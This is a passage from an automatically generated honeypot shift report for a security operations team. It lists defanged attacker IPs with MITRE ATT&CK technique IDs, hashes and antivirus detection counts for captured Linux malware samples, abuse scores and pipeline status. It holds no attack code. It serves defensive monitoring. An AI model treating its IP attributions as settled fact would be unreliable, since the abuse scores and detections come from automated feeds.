| `3.131.220[.]121` | **6** | 2026-04-14 04:10 | 2026-04-14 04:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **5** | 2026-04-14 03:39 | 2026-04-14 03:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `175.42.62[.]216` | **3** | 2026-04-14 05:45 | 2026-04-14 05:45 | 2m | 0 | `T1592` | 🟢 LOW |
| `112.91.141[.]33` | **2** | 2026-04-14 02:53 | 2026-04-14 02:55 | 2m | 0 | `T1592` | 🟢 LOW |
| `102.213.34[.]99` | 1 | 2026-04-14 02:21 | 2026-04-14 02:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.107.60[.]45` | 1 | 2026-04-14 04:12 | 2026-04-14 04:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.249.114[.]46` | 1 | 2026-04-14 04:16 | 2026-04-14 04:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.129.234[.]8` | 1 | 2026-04-14 05:51 | 2026-04-14 05:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.26.110[.]171` | 1 | 2026-04-14 03:37 | 2026-04-14 03:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.154.9[.]109` | 1 | 2026-04-14 05:37 | 2026-04-14 05:38 | 14s | 0 | `T1592` | 🟢 LOW |
| `124.228.34[.]69` | 1 | 2026-04-14 04:14 | 2026-04-14 04:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.161.249[.]165` | 1 | 2026-04-14 04:12 | 2026-04-14 04:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-04-14 03:02 | 2026-04-14 03:02 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.123[.]167` | 1 | 2026-04-14 04:15 | 2026-04-14 04:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]16` | 1 | 2026-04-14 04:12 | 2026-04-14 04:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.73.134[.]254` | 1 | 2026-04-14 03:45 | 2026-04-14 03:45 | 1s | 0 | `T1592` | 🟢 LOW |
| `41.38.156[.]126` | 1 | 2026-04-14 03:57 | 2026-04-14 03:58 | 13s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]28` | 1 | 2026-04-14 02:54 | 2026-04-14 02:54 | 7s | 0 | `T1592` | 🟢 LOW |
| `8.213.230[.]218` | 1 | 2026-04-14 05:51 | 2026-04-14 05:51 | 30s | 0 | `T1592` | 🟢 LOW |
| `83.219.249[.]173` | 1 | 2026-04-14 02:21 | 2026-04-14 02:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `41.38.156[.]126` | EG | TE Data | **100** ⚠️ | 9 |
| `14.103.82[.]142` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `121.227.152[.]250` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `205.164.114[.]59` | US | LifeinCloud LTD, | **100** ⚠️ | 9 |
| `114.129.234[.]8` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 0 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `152.89.253[.]36` | FR | YottaSrc Hosting and Cloud Services | **100** ⚠️ | 2 |
| `121.154.9[.]109` | KR | Korea Telecom | **100** ⚠️ | 4 |
| `71.6.232[.]28` | US | CariNet, Inc. | **100** ⚠️ | 50 |
| `8.213.230[.]218` | TH | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 18 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 411 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 187 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 137 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 70 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 69 |

---

## 🔕 False Positive Summary (31 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 440 cases |
| Tool 34  | Credential Extractor        | ✅ 325 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 31 filtered (7.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 29 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 137 priority case(s) shown individually · 30 recon entry/entries in table (14 group(s) consolidating 256 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T06:03:40Z_
